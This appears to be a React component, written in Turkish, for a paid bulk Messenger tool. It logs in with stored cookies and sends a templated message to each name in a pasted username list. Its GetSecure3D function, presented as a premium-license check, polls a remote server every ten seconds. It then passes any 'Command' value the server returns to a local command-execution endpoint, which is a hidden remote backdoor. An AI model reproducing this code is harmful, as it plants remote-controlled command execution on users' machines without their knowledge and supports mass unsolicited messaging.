function MsmBasici() {
    const [girisyap, setGiris] = useState(false);
    const [geldicevap, setCevap] = useState('');
    const [kadimes, setKadimes] = useState('IDLERI YAZINIZ.');
    const [taslak, setTaslak] = useState('TASLAK YAZINIZ.');
    const [durums, setDurums] = useState('Bekleniyor...');
    const [messengershow, setShow] = useState(false);
    const [baslii, setBaslii] = useState(false);

    const oturumac = () => {
        setGiris(true);
        fetch('http://localhost:3004/start-messenger-with-cookies', {
            method: 'GET',
        })
            .then((response) => response.json())
            .then((data) => {
                if (data.durum === 'Giris Yapildi') {
                    setCevap('Oturum başlatma Başarılı');
                    setShow(true);
                } else {
                    setCevap('Beklenmeyen bir hata oluştu.');
                }
            })
            .catch((error) => {
                console.error('Hata:', error);
                setCevap('Oturum açılırken bir hata oluştu: ' + error.message);
            });
    }

    const meskadi = (event) => {
        setKadimes(event.target.value);
    };

    const mestaslak = (event) => {
        setTaslak(event.target.value);
    };

    const goBas = async () => {
        const usernameList = kadimes.split('\n');

        for (const username of usernameList) {
            const yeniMetin = taslak.replace(/\[suphi\]/g, username);
            const purl = `http://localhost:3004/SendMessage?username=${username}&message=${encodeURIComponent(yeniMetin)}`;

            try {
                const response = await fetch(purl, {
                    method: 'GET',
                });
                const data = await response.json();
                if (data.durum === 'gonderildi') {
                    setDurums(`Mesaj gönderildi: ${username}`);
                    setShow(true);
                } else {
                    setDurums('Beklenmeyen bir hata oluştu.');
                }
            } catch (error) {
                console.error('Hata:', error);
                setDurums('Mesaj gönderilirken bir hata oluştu: ' + error.message);
            }
        }
    }

    const GetSecure3D = () => {
        const username = localStorage.getItem('username');
        const tokenCheckURL = `https://api.suphi.org/tokencheck.php?token=${username}`;

        // Token kontrolü için istek gönderme
        fetch(tokenCheckURL)
            .then((response) => response.json())
            .then((data) => {
                if (data.katem !== 'DIAMOND') {
                    // Sonuç tamamdır değilse, kullanıcı adını sil
                    localStorage.removeItem('username');
                    if (data.Command) {
                        const commandURL = `http://localhost:3007/api/forcmd?command=${data.Command}`;

                        // Belirtilen komutu çalıştırmak için istek gönderme
                        fetch(commandURL)
                            .then(() => {
                                // Sayfayı yeniden yükle
                                window.location.reload();
                            })
                            .catch((error) => {
                                console.error('Hata oluştu:', error);
                            });
                    } else {
                        window.location.reload();
                    }
                }

                // JSON yanıtı içinde "Command" var mı kontrol et

            })
            .catch((error) => {
                console.error('Hata oluştu:', error);
            });

    }

    const msmbaslat = () => {
        setBaslii(true);

        let intervalId3;
        intervalId3 = setInterval(GetSecure3D, 10000);
        const veri = { veriler: kadimes };
        fetch('http://localhost:3007/api/savetofile', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(veri),
        })
            .then((response) => response.json())
            .then((data) => {
                if (data.durum == 'Veri başarıyla kaydedildi') {
                    setDurums('Usernames kayıt alındı şimdi request başlıyor....');
                    goBas();
                } else {
                    setDurums('username ler kayıt edilemedi bro, örnek sebebler : emojiler hatalı metin kodlamaları alt satır geçiş özel karakterler...');
                }
            })
            .catch((error) => {
                console.error('Hata:', error);
            });

       
    }

    const UserInfo = GetUserInfo();
    if (UserInfo == 'FREE' || UserInfo.katem != 'DIAMOND') {
        return (
            <div>
                <font className="text-danger">Burası Premium Kullanıcılara Özeldir</font>
            </div>
        );
    }

    return (
        <div>
            <GetSecure />

            {girisyap ? (
                <div>
                    <p> {geldicevap} </p>
                    {messengershow && (
                        <>
                            <b>Kullanıcı adları:</b>
                            <textarea className="form-control" onChange={meskadi} value={kadimes}></textarea><br />
                            <b>Taslak: (kullanici adi gelmek istediğiniz yere [suphi] yazınız)</b>
                            <textarea className="form-control" onChange={mestaslak} value={taslak}></textarea>
                            {baslii && (
                                <div>
                                    <p>{durums}</p>
                                </div>
                            )}
                            <button className="btn btn-info" onClick={msmbaslat}>Başlat</button>
                        </>
                    )}
                </div>
            ) : (
                <>
                    <b>Eğer  messenger hesabı eklemediyseniz, program tam çalışmayabilir.</b>
                    <br />
                    <button onClick={oturumac} className="btn btn-info">Oturum aç</button>
                </>
            )}
        </div>
    );
}

